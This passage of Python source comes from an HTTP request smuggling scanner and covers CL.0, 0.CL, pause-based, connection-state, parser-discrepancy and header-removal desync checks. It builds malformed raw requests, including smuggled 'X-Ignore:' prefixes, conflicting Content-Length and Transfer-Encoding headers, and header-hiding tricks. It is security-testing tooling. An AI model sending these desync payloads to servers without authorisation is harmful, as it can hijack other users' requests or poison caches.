import random
import re
import sys
import time
from copy import deepcopy
from datetime import datetime
from lib.Payload import (
	Payload, Chunked, EndChunk, RawPayload,
	ChunkedExt, EndChunkExt, EndChunkBareLF, ChunkedBareLF, EndChunkBareCR, RN,
)
from lib.EasySSL import EasySSL
from lib.Fingerprint import Fingerprint, baseline_fingerprint

GADGETS = [
	{"path": "/robots.txt", "look_for": "llow:", "header_only": False},
	{"path": "/?wrtztrw=wrtztrw", "look_for": "wrtztrw", "header_only": False},
	{"path": "/favicon.ico", "look_for": "Content-Type: image/", "header_only": True},
	{"path": "/sitemap.xml", "look_for": "Content-Type: application/xml", "header_only": True},
]


def _legacy_match(resp):
	"""Default match predicate used when no oracle is available: classic
	smuggler behavior -- accept the robots.txt body marker OR the 405
	method-not-allowed status that signals the smuggled request reached
	the backend but was rejected."""
	if not resp:
		return False
	return ("llow:" in resp) or (_get_status(resp) == "405")


def _structural_diff(probe_fp, baseline_fp, noisy_axes):
	"""Axes that probe_fp diverges from baseline_fp on, excluding axes
	known to be noisy for this target."""
	return probe_fp.diff(baseline_fp) - (noisy_axes or set())


def _is_structurally_different(probe_fp, baseline_fp, noisy_axes):
	"""True iff the probe response diverges from baseline on the status
	axis (always-significant) OR on >=2 non-noisy axes (multi-axis
	threshold rejects single-noisy-axis blips that slipped past the
	baseline sampler).
	"""
	axes = _structural_diff(probe_fp, baseline_fp, noisy_axes)
	return "status" in axes or len(axes) >= 2


def _fp_from_bytes_or_str(resp):
	"""Adapter: scanner internals carry responses as strings post-
	``_filter_response`` while ``Fingerprint.from_response`` accepts
	either bytes or str. Centralizing the encode here keeps the call
	sites uncluttered."""
	if resp is None:
		return Fingerprint.from_response(b"")
	if isinstance(resp, (bytes, bytearray)):
		return Fingerprint.from_response(resp)
	return Fingerprint.from_response(resp.encode('latin-1', errors='replace'))


def _victim_baseline_for(scanner):
	"""Sample a 3-shot victim-leg baseline on the first call and cache
	on the scanner instance for the rest of its run. Shape mirrors the
	follow-up GET that every pipeline-gadget scanner pipelines after
	its attack request so the diff has a meaningful reference.

	Returns (baseline_fp, noisy_axes); on total failure returns an
	empty fingerprint with every axis marked noisy -- callers'
	``_is_structurally_different`` will then always say "no diff" and
	the scanner falls back to its primary gadget-match signal alone.
	"""
	cached = getattr(scanner, "_victim_baseline_cache", None)
	if cached is not None:
		return cached
	req = _build_raw_request("GET", scanner.endpoint, scanner.vhost,
		extra_headers=getattr(scanner, "extra_headers", None))
	fp, noisy = baseline_fingerprint(
		scanner.host, scanner.port, scanner.ssl_flag,
		scanner.timeout, req, scanner.proxy, n=3,
	)
	scanner._victim_baseline_cache = (fp, noisy)
	# Capture one raw baseline response too, so victim-leg findings can show a
	# real control body in the GUI (not just the fingerprint). Best-effort.
	scanner._victim_baseline_raw = None
	try:
		web = _make_connection(scanner.host, scanner.port, scanner.ssl_flag,
			scanner.timeout, scanner.proxy)
		web.send(req.encode())
		scanner._victim_baseline_raw = _filter_response(web.recv_all(scanner.timeout))
		web.close()
	except Exception:
		pass
	return fp, noisy


def _resolve_smuggle(oracle, vhost):
	"""Return (terminated_request, unterminated_prefix, match_fn, label).

	- ``terminated_request`` is a complete inner request used as the
	  smuggled payload for TE.0 / bare-LF chunked attacks (the chunk
	  body terminates and the backend reads a fresh request).
	- ``unterminated_prefix`` is the CL.0 / Expect / Pause variant:
	  request-line + ``X-Ignore: `` with no terminator, so the next
	  pipelined request's bytes get consumed as the header value.
	- ``match_fn(response_str) -> bool`` returns True when the gadget
	  signature is visible in the response.
	- ``label`` identifies the gadget for payload filenames / logging.

	When ``oracle`` is None or the oracle can't find a viable gadget we
	fall back to the legacy ``/robots.txt`` + ``"llow:"`` pair so no
	caller has to handle the unavailable case.
	"""
	if oracle is not None:
		try:
			gadget = oracle.select()
		except Exception:
			gadget = None
		if gadget is not None:
			path = gadget.smuggle_path
			method = gadget.method
			if path == "*":
				head = "%s * HTTP/1.1\r\n" % method
			else:
				head = "%s %s HTTP/1.1\r\n" % (method, path)
			terminated = head + "Host: %s\r\nX-Smug: 1\r\n\r\n" % vhost
			unterminated = head + "X-Ignore: "

			def _match(resp, _g=gadget):
				if not resp:
					return False
				if _g.matches(resp):
					return True
				return _get_status(resp) == "405"

			return terminated, unterminated, _match, gadget.name

	terminated = "GET /robots.txt HTTP/1.1\r\nHost: %s\r\nX-Smug: 1\r\n\r\n" % vhost
	unterminated = "GET /robots.txt HTTP/1.1\r\nX-Ignore: "
	return terminated, unterminated, _legacy_match, "robots-legacy"


def _filter_response(res):
	if res is None:
		return ""
	if isinstance(res, bytes):
		res_str = ""
		for b in res:
			if b > 0x7F:
				res_str += '\x30'
			else:
				res_str += chr(b)
		return res_str
	return res


def _get_status(response_str):
	if response_str and len(response_str) > 12:
		return response_str[9:12]
	return ""


def _make_connection(host, port, ssl_flag, timeout, proxy=None):
	web = EasySSL(ssl_flag)
	web.connect(host, port, timeout, proxy)
	return web


def _inject_extra_headers(raw, extra_headers):
	"""Carry the user's custom request headers (Authorization, X-Dtc, ...) into
	a raw HTTP request string.

	Splits the header block from the body at the first blank line, drops any
	existing header line whose name collides with a custom header (so a
	user-supplied User-Agent/Content-Type replaces the scanner's hardcoded
	default instead of duplicating it), appends the custom headers at the end of
	the header block, and reassembles. Framing headers are never present in
	``extra_headers`` (they are filtered out at parse time in RequestFile), so
	the Content-Length / Transfer-Encoding / Connection lines are preserved.

	A no-op when ``extra_headers`` is empty, so callers without a custom request
	are byte-for-byte unchanged.
	"""
	if not extra_headers:
		return raw
	sep = "\r\n\r\n"
	idx = raw.find(sep)
	if idx == -1:
		sep = "\n\n"
		idx = raw.find(sep)
	if idx == -1:
		head, body, had_sep = raw, "", False
	else:
		head, body, had_sep = raw[:idx], raw[idx + len(sep):], True
	custom_names = {h.split(':', 1)[0].strip().lower() for h in extra_headers}
	kept = []
	for line in head.split("\r\n"):
		if ':' in line and line.split(':', 1)[0].strip().lower() in custom_names:
			continue
		kept.append(line)
	head = "\r\n".join(kept)
	if head and not head.endswith("\r\n"):
		head += "\r\n"
	head += ''.join(h + "\r\n" for h in extra_headers)
	return head + "\r\n" + body if had_sep else head


def _build_raw_request(method, endpoint, host, headers=None, body="", http_version="1.1", extra_headers=None):
	cb = str(random.random()).split('.')[1]
	req = "%s %s?cb=%s HTTP/%s\r\n" % (method, endpoint, cb, http_version)
	req += "Host: %s\r\n" % host
	req += "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.44 Safari/537.36\r\n"
	req += "Content-Type: application/x-www-form-urlencoded\r\n"
	if headers:
		for h in headers:
			req += h + "\r\n"
	req += "Content-Length: %d\r\n" % len(body)
	req += "Connection: keep-alive\r\n"
	req += "\r\n"
	req += body
	return _inject_extra_headers(req, extra_headers)


class ScanCL0:
	name = "CL.0 / 0.CL Desync"

	def __init__(self, host, port, ssl_flag, timeout, method, endpoint, vhost, proxy, logh, quiet, cookies, oracle=None, extra_headers=None):
		self.host = host
		self.port = port
		self.ssl_flag = ssl_flag
		self.timeout = timeout
		self.method = method
		self.endpoint = endpoint
		self.vhost = vhost or host
		self.proxy = proxy
		self.logh = logh
		self.quiet = quiet
		self.cookies = cookies
		self.oracle = oracle
		self.extra_headers = extra_headers or []
		self._gadget = None

	def _select_gadget(self):
		# Prefer the per-target oracle when wired in: it gives us a
		# gadget with an auto-derived look_for plus a per-run canary --
		# both eliminate FP/FN failure modes of the static catalogue.
		if self.oracle is not None:
			try:
				og = self.oracle.select()
			except Exception:
				og = None
			if og is not None:
				gadget = {
					"path": og.smuggle_path,
					"look_for": og.look_for,
					"header_only": og.header_only,
					"_oracle": og,
				}
				self._gadget = gadget
				return gadget

		for gadget in GADGETS:
			try:
				web = _make_connection(self.host, self.port, self.ssl_flag, self.timeout, self.proxy)
				req = _build_raw_request("GET", gadget["path"], self.vhost)
				web.send(req.encode())
				res = web.recv_all(self.timeout)
				web.close()
				if res is None:
					continue
				res_str = _filter_response(res)
				if gadget["header_only"]:
					hdr_end = res_str.find("\r\n\r\n")
					check_region = res_str[:hdr_end] if hdr_end > 0 else res_str
				else:
					check_region = res_str
				if gadget["look_for"] in check_region:
					base_req = _build_raw_request(self.method, self.endpoint, self.vhost,
						extra_headers=self.extra_headers)
					base_web = _make_connection(self.host, self.port, self.ssl_flag, self.timeout, self.proxy)
					base_web.send(base_req.encode())
					base_res = base_web.recv_all(self.timeout)
					base_web.close()
					base_str = _filter_response(base_res)
					if gadget["look_for"] not in base_str:
						self._gadget = gadget
						return gadget
			except Exception:
				continue
		return None

	def _gadget_matches(self, gadget, response_str):
		"""Use the oracle's predicate when one is attached; fall back to
		header/full substring + the 405 method-not-allowed tell."""
		if not response_str:
			return False
		og = gadget.get("_oracle") if isinstance(gadget, dict) else None
		if og is not None:
			if og.matches(response_str):
				return True
			return _get_status(response_str) == "405"
		region = response_str
		if gadget.get("header_only"):
			hdr_end = response_str.find("\r\n\r\n")
			if hdr_end > 0:
				region = response_str[:hdr_end]
		if gadget["look_for"] in region:
			return True
		return _get_status(response_str) == "405"

	def _build_cl0_attack(self, method, gadget, cookie_hdr, with_expect=False):
		path = gadget["path"]
		og = gadget.get("_oracle") if isinstance(gadget, dict) else None
		if path == "*":
			smuggled_prefix = "OPTIONS * HTTP/1.1\r\nX-Ignore: "
		else:
			inner_method = og.method if og is not None else "GET"
			smuggled_prefix = "%s %s HTTP/1.1\r\nX-Ignore: " % (inner_method, path)
		cb = str(random.random()).split('.')[1]
		req = "%s %s?cb=%s HTTP/1.1\r\n" % (method, self.endpoint, cb)
		req += "Host: %s\r\n" % self.vhost
		req += "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.44 Safari/537.36\r\n"
		req += "Content-Type: application/x-www-form-urlencoded\r\n"
		if cookie_hdr:
			req += cookie_hdr
		if with_expect:
			req += "Expect: 100-continue\r\n"
		req += "Content-Length: %d\r\n" % len(smuggled_prefix)
		req += "Connection: keep-alive\r\n"
		req += "\r\n"
		req += smuggled_prefix
		return _inject_extra_headers(req, self.extra_headers)

	def _attempt_cl0(self, method, gadget, cookie_hdr, label, ptype, print_fn, write_fn,
			with_expect=False, attempts=5, threshold=3):
		baseline_fp, noisy = _victim_baseline_for(self)
		confirmed = 0
		for _attempt in range(attempts):
			try:
				web = _make_connection(self.host, self.port, self.ssl_flag, self.timeout, self.proxy)
				req = self._build_cl0_attack(method, gadget, cookie_hdr, with_expect=with_expect)
				follow_req = _build_raw_request("GET", self.endpoint, self.vhost,
					extra_headers=self.extra_headers)
				web.pipeline_send([req, follow_req])
				responses = web.recv_multiple(2, self.timeout)
				web.close()

				if len(responses) >= 2:
					second_resp = _filter_response(responses[1].encode('latin-1'))
					gadget_hit = self._gadget_matches(gadget, second_resp)
					# Corroborate the gadget oracle with a structural
					# diff. Catches desyncs where the gadget body is
					# swallowed by a sanitizer but the victim leg comes
					# back empty / truncated / status-flipped -- a real
					# desync the old code would have called clean.
					victim_fp = _fp_from_bytes_or_str(second_resp)
					victim_diverges = _is_structurally_different(victim_fp, baseline_fp, noisy)
					if gadget_hit or victim_diverges:
						confirmed += 1
						if confirmed >= threshold:
							annot = []
							if gadget_hit:
								annot.append("gadget")
							if victim_diverges:
								diff = _structural_diff(victim_fp, baseline_fp, noisy)
								annot.append("fp=" + "+".join(sorted(diff)))
							print_fn(label, "Confirmed %s desync via %s (%s) [%s]" % (
								label, method, gadget["path"], ",".join(annot)))
							raw = RawPayload()
							raw.data = req.encode('latin-1')
							write_fn(self.host, raw, ptype,
								response=second_resp,
								baseline=getattr(self, "_victim_baseline_raw", None),
								details={
									"scan": "cl0",
									"label": label,
									"attack_status": _get_status(second_resp),
									"baseline_status": baseline_fp.status,
									"fp_axes": sorted(_structural_diff(victim_fp, baseline_fp, noisy)),
									"gadget_hit": gadget_hit,
								})
							return True
			except Exception:
				continue
		return False

	def run(self, print_fn, write_fn):
		gadget = self._select_gadget()
		if not gadget:
			# Legacy fallback: smuggle a GET /robots.txt and look for the
			# "llow:" (A/Disallow) marker -- the same default the rest of the
			# engine uses (_resolve_smuggle). The old fallback baked the HTTP
			# version into the path ("/ HTTP/1.1"), which _build_cl0_attack then
			# expanded to "GET / HTTP/1.1 HTTP/1.1 ..." -- a malformed request
			# that could never confirm, and "TRACE" almost never matched.
			print_fn("CL.0", "No viable gadget found for CL.0 detection, using /robots.txt fallback")
			gadget = {"path": "/robots.txt", "look_for": "llow:", "header_only": False}
			self._gadget = gadget

		cookie_hdr = ""
		if self.cookies:
			cookie_hdr = "Cookie: " + ''.join(self.cookies) + "\r\n"

		# CL.0 is highly method-sensitive: backends that strip the body for
		# safe methods (GET, HEAD) may not drop it for POST and vice-versa.
		# Try the configured method first, then fall back to GET/POST so we
		# don't miss findings purely because of the user's --method choice.
		methods_to_try = []
		for m in [self.method, "GET", "POST"]:
			if m not in methods_to_try:
				methods_to_try.append(m)

		any_found = False
		for method in methods_to_try:
			if self._attempt_cl0(method, gadget, cookie_hdr, "CL.0", "CL0_%s" % method,
					print_fn, write_fn):
				any_found = True
				break

		# 0.CL via Expect: 100-continue (front-end forwards body, backend
		# ignores due to expect handling). Same method-sensitivity rules.
		for method in methods_to_try:
			if self._attempt_cl0(method, gadget, cookie_hdr, "0.CL", "0CL_%s" % method,
					print_fn, write_fn, with_expect=True):
				any_found = True
				break

		if not any_found:
			print_fn("CL.0", "No CL.0/0.CL desync detected")
		return any_found


class ScanPauseDesync:
	name = "Pause-Based Desync"

	def __init__(self, host, port, ssl_flag, timeout, method, endpoint, vhost, proxy, logh, quiet, cookies, pause_timeout=61, oracle=None, extra_headers=None):
		self.host = host
		self.port = port
		self.ssl_flag = ssl_flag
		self.timeout = timeout
		self.method = method
		self.endpoint = endpoint
		self.vhost = vhost or host
		self.proxy = proxy
		self.logh = logh
		self.quiet = quiet
		self.cookies = cookies
		self.pause_timeout = pause_timeout
		self.oracle = oracle
		self.extra_headers = extra_headers or []

	def run(self, print_fn, write_fn):
		cookie_hdr = ""
		if self.cookies:
			cookie_hdr = "Cookie: " + ''.join(self.cookies) + "\r\n"

		_terminated, smuggled_prefix, match_fn, gadget_label = _resolve_smuggle(self.oracle, self.vhost)
		baseline_fp, noisy = _victim_baseline_for(self)

		confirmed = 0
		for attempt in range(3):
			try:
				web = _make_connection(self.host, self.port, self.ssl_flag, max(self.timeout, self.pause_timeout + 10), self.proxy)

				cb = str(random.random()).split('.')[1]
				headers_part = "%s %s?cb=%s HTTP/1.1\r\n" % (self.method, self.endpoint, cb)
				headers_part += "Host: %s\r\n" % self.vhost
				headers_part += "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.44 Safari/537.36\r\n"
				headers_part += "Content-Type: application/x-www-form-urlencoded\r\n"
				if cookie_hdr:
					headers_part += cookie_hdr
				headers_part += "Content-Length: %d\r\n" % len(smuggled_prefix)
				headers_part += "Connection: keep-alive\r\n"
				headers_part += "\r\n"
				headers_part = _inject_extra_headers(headers_part, self.extra_headers)

				print_fn("Pause", "Sending headers then pausing %ds (attempt %d/3)..." % (self.pause_timeout, attempt + 1))
				web.send_timed(
					headers_part.encode('latin-1'),
					smuggled_prefix.encode('latin-1'),
					self.pause_timeout
				)

				follow_req = _build_raw_request("GET", self.endpoint, self.vhost,
					extra_headers=self.extra_headers)
				web.send(follow_req.encode())

				responses = web.recv_multiple(2, self.timeout)
				web.close()

				if len(responses) >= 2:
					second_resp = _filter_response(responses[1].encode('latin-1'))
					victim_fp = _fp_from_bytes_or_str(second_resp)
					gadget_hit = match_fn(second_resp)
					victim_diverges = _is_structurally_different(victim_fp, baseline_fp, noisy)
					if gadget_hit or victim_diverges:
						confirmed += 1
						if confirmed >= 2:
							annot = []
							if gadget_hit:
								annot.append("gadget=%s" % gadget_label)
							if victim_diverges:
								diff = _structural_diff(victim_fp, baseline_fp, noisy)
								annot.append("fp=" + "+".join(sorted(diff)))
							print_fn("Pause", "Potential pause-based desync confirmed [%s]" % ",".join(annot))
							raw = RawPayload()
							raw.data = (headers_part + "[PAUSE %ds]" % self.pause_timeout + smuggled_prefix).encode('latin-1')
							write_fn(self.host, raw, "PAUSE",
								response=second_resp,
								baseline=getattr(self, "_victim_baseline_raw", None),
								details={
									"scan": "pause",
									"label": gadget_label,
									"attack_status": _get_status(second_resp),
									"baseline_status": baseline_fp.status,
									"fp_axes": sorted(_structural_diff(victim_fp, baseline_fp, noisy)),
									"gadget_hit": gadget_hit,
								})
							return True
			except Exception:
				continue

		print_fn("Pause", "No pause-based desync detected")
		return False


class ScanConnectionState:
	name = "Connection State Attack"

	def __init__(self, host, port, ssl_flag, timeout, method, endpoint, vhost, proxy, logh, quiet, cookies, oracle=None, extra_headers=None):
		self.host = host
		self.port = port
		self.ssl_flag = ssl_flag
		self.timeout = timeout
		self.method = method
		self.endpoint = endpoint
		self.vhost = vhost or host
		self.proxy = proxy
		self.logh = logh
		self.quiet = quiet
		self.cookies = cookies
		self.oracle = oracle
		self.extra_headers = extra_headers or []

	def run(self, print_fn, write_fn):
		canary = "smglr" + str(random.randint(10000, 99999))
		bad_host = canary + "." + self.vhost
		found = False

		try:
			normal_req = _build_raw_request(self.method, self.endpoint, self.vhost,
				["Connection: keep-alive"], extra_headers=self.extra_headers)
			canary_req = _build_raw_request(self.method, self.endpoint, bad_host,
				["Connection: keep-alive"], extra_headers=self.extra_headers)

			web = _make_connection(self.host, self.port, self.ssl_flag, self.timeout, self.proxy)
			web.pipeline_send([normal_req, canary_req])
			pipeline_resps = web.recv_multiple(2, self.timeout)
			web.close()

			if len(pipeline_resps) < 2:
				print_fn("ConnState", "Could not pipeline requests, skipping")
				return False

			indirect_resp = _filter_response(pipeline_resps[1].encode('latin-1'))
			indirect_status = _get_status(indirect_resp)
			indirect_fp = _fp_from_bytes_or_str(indirect_resp)

			web2 = _make_connection(self.host, self.port, self.ssl_flag, self.timeout, self.proxy)
			web2.send(canary_req.encode())
			direct_res = web2.recv_all(self.timeout)
			web2.close()
			direct_resp = _filter_response(direct_res)
			direct_status = _get_status(direct_resp)
			direct_fp = _fp_from_bytes_or_str(direct_resp)

			# Build a fingerprint diff between direct and indirect runs.
			# We don't have a separate noisy-axes baseline here (the
			# server only saw two requests), so a single-axis flip on
			# Set-Cookie / Date won't trigger; we require either status
			# divergence OR >=2 axes to flip, same threshold the
			# helpers use elsewhere.
			fp_diff = _structural_diff(indirect_fp, direct_fp, set())
			status_diverges = indirect_status and direct_status and indirect_status != direct_status
			fp_diverges_only = (not status_diverges) and ("status" not in fp_diff) and (len(fp_diff) >= 2)

			# Shared sidecar context: the reused-connection (indirect) leg is the
			# anomaly; the direct single-connection request is the baseline.
			_cs_details = {
				"scan": "connection-state",
				"attack_status": indirect_status,
				"baseline_status": direct_status,
				"fp_axes": sorted(fp_diff),
			}

			if status_diverges:
				web3 = _make_connection(self.host, self.port, self.ssl_flag, self.timeout, self.proxy)
				web3.pipeline_send([normal_req, canary_req])
				confirm_resps = web3.recv_multiple(2, self.timeout)
				web3.close()

				if len(confirm_resps) >= 2:
					confirm_resp = _filter_response(confirm_resps[1].encode('latin-1'))
					confirm_status = _get_status(confirm_resp)
					if confirm_status != direct_status:
						print_fn("ConnState", "Connection state discrepancy: direct=%s indirect=%s" % (direct_status, indirect_status))
						raw = RawPayload()
						raw.data = ("# Request 1 (setup):\n" + normal_req + "\n# Request 2 (canary):\n" + canary_req).encode('latin-1')
						write_fn(self.host, raw, "CONNSTATE",
							response=indirect_resp, baseline=direct_resp,
							details=dict(_cs_details, label="CONNSTATE"))
						found = True
			elif fp_diverges_only:
				# Status matched but the indirect response structurally
				# diverged on multiple axes (headers / body shape). Confirm
				# with one more pipeline before flagging.
				web3 = _make_connection(self.host, self.port, self.ssl_flag, self.timeout, self.proxy)
				web3.pipeline_send([normal_req, canary_req])
				confirm_resps = web3.recv_multiple(2, self.timeout)
				web3.close()

				if len(confirm_resps) >= 2:
					confirm_resp = _filter_response(confirm_resps[1].encode('latin-1'))
					confirm_fp = _fp_from_bytes_or_str(confirm_resp)
					confirm_diff = _structural_diff(confirm_fp, direct_fp, set())
					if len(confirm_diff) >= 2:
						print_fn("ConnState", "Subtle connection state discrepancy: status=%s fp axes: %s" % (
							direct_status, "+".join(sorted(fp_diff)) or "?"))
						raw = RawPayload()
						raw.data = ("# Request 1 (setup):\n" + normal_req + "\n# Request 2 (canary):\n" + canary_req).encode('latin-1')
						write_fn(self.host, raw, "CONNSTATE_FP",
							response=indirect_resp, baseline=direct_resp,
							details=dict(_cs_details, label="CONNSTATE_FP"))
						found = True

			indirect_canary_count = indirect_resp.count(canary) if indirect_resp else 0
			direct_canary_count = direct_resp.count(canary) if direct_resp else 0
			if indirect_canary_count != direct_canary_count:
				print_fn("ConnState", "Connection state reflection diff: direct=%d indirect=%d reflections of canary" % (direct_canary_count, indirect_canary_count))
				if not found:
					raw = RawPayload()
					raw.data = ("# Request 1 (setup):\n" + normal_req + "\n# Request 2 (canary):\n" + canary_req).encode('latin-1')
					write_fn(self.host, raw, "CONNSTATE-REFLECT",
						response=indirect_resp, baseline=direct_resp,
						details=dict(_cs_details, label="CONNSTATE-REFLECT"))
					found = True

		except Exception:
			pass

		if not found:
			print_fn("ConnState", "No connection state issues detected")
		return found


class ScanParserDiscrepancy:
	name = "Parser Discrepancy Detection"

	HIDE_TECHNIQUES = {
		"space": lambda h: " " + h,
		"tab": lambda h: "\t" + h,
		"wrap": lambda h: "X-Ignore: 1\r\n " + h,
		"hop": lambda h: "Connection: %s\r\n%s" % (h.split(":")[0], h),
		"lpad": lambda h: "X" * 8000 + ": Y\r\n" + h,
	}

	CANARIES = [
		{"name": "Host-invalid", "header": "Host", "value": "foo/bar", "extra": True},
		{"name": "Host-valid-missing", "header": "Host", "value": "__HOST__", "extra": False},
		{"name": "CL-invalid", "header": "Content-Length", "value": "Z", "extra": True},
		# Conflicting Content-Length pair: if either parser silently accepts
		# only one, status will diverge from baseline.
		{"name": "CL-CL-conflict", "header": "Content-Length", "value": "0\r\nContent-Length: 6", "extra": True},
		# TE joint-values: front-end may pick first token, backend the last.
		{"name": "TE-joint-chunked", "header": "Transfer-Encoding", "value": "chunked, chunked", "extra": True},
		{"name": "TE-joint-identity", "header": "Transfer-Encoding", "value": "identity, chunked", "extra": True},
	]

	def __init__(self, host, port, ssl_flag, timeout, method, endpoint, vhost, proxy, logh, quiet, cookies, oracle=None, extra_headers=None):
		self.host = host
		self.port = port
		self.ssl_flag = ssl_flag
		self.timeout = timeout
		self.method = method
		self.endpoint = endpoint
		self.vhost = vhost or host
		self.proxy = proxy
		self.logh = logh
		self.quiet = quiet
		self.cookies = cookies
		self.oracle = oracle
		self.extra_headers = extra_headers or []

	def _send_probe(self, request_str):
		try:
			web = _make_connection(self.host, self.port, self.ssl_flag, self.timeout, self.proxy)
			web.send(request_str.encode('latin-1'))
			res = web.recv_all(self.timeout)
			web.close()
			return _filter_response(res)
		except Exception:
			return None

	def run(self, print_fn, write_fn):
		cookie_hdr = ""
		if self.cookies:
			cookie_hdr = "Cookie: " + ''.join(self.cookies) + "\r\n"

		base_req = _build_raw_request(self.method, self.endpoint, self.vhost,
			["Connection: keep-alive"], extra_headers=self.extra_headers)
		base_resp = self._send_probe(base_req)
		if not base_resp:
			print_fn("ParserDisc", "Cannot establish baseline, skipping")
			return False
		base_status = _get_status(base_resp)

		def _make_probe(hidden_header):
			cb = str(random.random()).split('.')[1]
			req = "%s %s?cb=%s HTTP/1.1\r\n" % (self.method, self.endpoint, cb)
			req += "Host: %s\r\n" % self.vhost
			req += "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.44 Safari/537.36\r\n"
			req += "Content-Type: application/x-www-form-urlencoded\r\n"
			if cookie_hdr:
				req += cookie_hdr
			req += hidden_header + "\r\n"
			req += "Content-Length: 0\r\n"
			req += "Connection: keep-alive\r\n"
			req += "\r\n"
			return _inject_extra_headers(req, self.extra_headers)

		# Per-technique control: if the hide technique ALONE (applied to a
		# benign no-op header) already changes the status, the technique
		# itself is malformed enough to be visible to the front-end. We
		# can't draw any conclusion about its hide-ability for the actual
		# canary -- skip the canary checks for this technique.
		found = False
		for tech_name, tech_fn in self.HIDE_TECHNIQUES.items():
			control_header = tech_fn("X-Nop: 1")
			control_resp = self._send_probe(_make_probe(control_header))
			control_status = _get_status(control_resp) if control_resp else ""
			tech_is_visible = control_status != "" and control_status != base_status

			for canary in self.CANARIES:
				header_line = "%s: %s" % (canary["header"], canary["value"].replace("__HOST__", self.vhost))
				hidden_header = tech_fn(header_line)
				probe_req = _make_probe(hidden_header)
				probe_resp = self._send_probe(probe_req)
				if probe_resp is None:
					continue

				probe_status = _get_status(probe_resp)

				if canary["extra"]:
					if probe_status == base_status:
						# If the technique itself is visible (control != base)
						# but the canary version matches base, the front-end
						# specifically stripped the canary -- still a real
						# HIDDEN finding. If both control and probe match
						# base, the technique is genuinely a hide.
						outcome = "HIDDEN"
					elif probe_status == "":
						outcome = "BLOCKED"
					else:
						outcome = "VISIBLE"
				else:
					if probe_status != base_status:
						# Could be "IGNORED" OR could just be the technique
						# itself rejecting the request. Require control to
						# also have matched baseline before flagging.
						if tech_is_visible:
							outcome = "VISIBLE"  # technique itself is broken
						else:
							outcome = "IGNORED"
					else:
						outcome = "VISIBLE"

				if outcome in ("HIDDEN", "IGNORED"):
					confirmed = True
					for _ in range(3):
						c_resp = self._send_probe(probe_req)
						if c_resp is None:
							confirmed = False
							break
						c_status = _get_status(c_resp)
						if canary["extra"]:
							if c_status != base_status:
								confirmed = False
								break
						else:
							if c_status == base_status:
								confirmed = False
								break

					if confirmed:
						# Fingerprint-axis annotation: even when the
						# status oracle is decisive, knowing whether
						# headers/body also moved gives the operator a
						# crisper picture (and downgrades a "HIDDEN"
						# finding to "PARTIAL-HIDE" when non-status
						# axes show the backend actually saw something
						# differently).
						base_fp = _fp_from_bytes_or_str(base_resp)
						probe_fp = _fp_from_bytes_or_str(probe_resp)
						fp_diff = probe_fp.diff(base_fp) - {"status"}
						annotation = ""
						label = outcome
						if outcome == "HIDDEN" and fp_diff:
							label = "PARTIAL-HIDE"
							annotation = " [fp:%s]" % "+".join(sorted(fp_diff))
						elif fp_diff:
							annotation = " [fp:%s]" % "+".join(sorted(fp_diff))

						print_fn("ParserDisc", "Discrepancy: %s via %s is %s (status %s vs base %s)%s" % (
							canary["name"], tech_name, label, probe_status, base_status, annotation))
						raw = RawPayload()
						raw.data = probe_req.encode('latin-1')
						write_fn(self.host, raw, "PARSERDISC_%s_%s" % (tech_name, canary["name"]),
							response=probe_resp, baseline=base_resp, details={
								"scan": "parser-discrepancy",
								"mutation": canary["name"],
								"label": label,
								"attack_status": probe_status,
								"baseline_status": base_status,
								"fp_axes": sorted(fp_diff),
							})
						found = True

		if not found:
			print_fn("ParserDisc", "No parser discrepancies detected")
		return found


class ScanHeaderRemoval:
	name = "Header Removal Detection"

	def __init__(self, host, port, ssl_flag, timeout, method, endpoint, vhost, proxy, logh, quiet, cookies, oracle=None, extra_headers=None):
		self.host = host
		self.port = port
		self.ssl_flag = ssl_flag
		self.timeout = timeout
		self.method = method
		self.endpoint = endpoint
		self.vhost = vhost or host
		self.proxy = proxy
		self.logh = logh
		self.quiet = quiet
		self.cookies = cookies
		self.oracle = oracle
		self.extra_headers = extra_headers or []

	def run(self, print_fn, write_fn):
		canary = "wrtzwrrrrr"

		cookie_hdr = ""
		if self.cookies:
			cookie_hdr = "Cookie: " + ''.join(self.cookies) + "\r\n"

		body = "Host: " + canary
		cb = str(random.random()).split('.')[1]
		attack_req = "POST %s?cb=%s HTTP/1.1\r\n" % (self.endpoint, cb)
		attack_req += "Host: %s\r\n" % self.vhost
		attack_req += "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.44 Safari/537.36\r\n"
		attack_req += "Content-Type: application/x-www-form-urlencoded\r\n"
		if cookie_hdr:
			attack_req += cookie_hdr
		attack_req += "Connection: keep-alive\r\n"
		attack_req += "Keep-Alive: timeout=5, max=1000\r\n"
		attack_req += "Content-Length: %d\r\n" % len(body)
		attack_req += "\r\n"
		attack_req += body
		attack_req = _inject_extra_headers(attack_req, self.extra_headers)

		harmless_req = attack_req.replace("Keep-Alive:", "Eat-Alive:")

		# Each iteration sends BOTH requests so they are compared as a matched
		# pair. The previous implementation kept stale harmless_resp across
		# the loop, leaving the final comparison potentially using responses
		# from different points in time / different upstreams.
		differing_pairs = 0
		fp_only_pairs = 0
		last_fp_diff = set()
		# Per-category snapshots so each finding's sidecars/meta describe the
		# leg that actually triggered IT. The status/canary-flip category (dp_*)
		# and the fp-only category (fp_*) are mutually exclusive per iteration
		# (fp-only is the elif), so a shared snapshot could otherwise attach a
		# status-matched pair to a "status differing" finding and vice-versa.
		dp_attack_req = dp_attack_resp = dp_harmless_resp = None
		dp_a_status = dp_h_status = None
		fp_attack_req = fp_attack_resp = fp_harmless_resp = None
		fp_a_status = fp_h_status = None
		for attempt in range(5):
			try:
				web_h = _make_connection(self.host, self.port, self.ssl_flag, self.timeout, self.proxy)
				web_h.send(harmless_req.encode())
				h_res = web_h.recv_all(self.timeout)
				web_h.close()
				harmless_resp = _filter_response(h_res)
				if not harmless_resp:
					continue

				web_a = _make_connection(self.host, self.port, self.ssl_flag, self.timeout, self.proxy)
				web_a.send(attack_req.encode())
				a_res = web_a.recv_all(self.timeout)
				web_a.close()
				attack_resp = _filter_response(a_res)
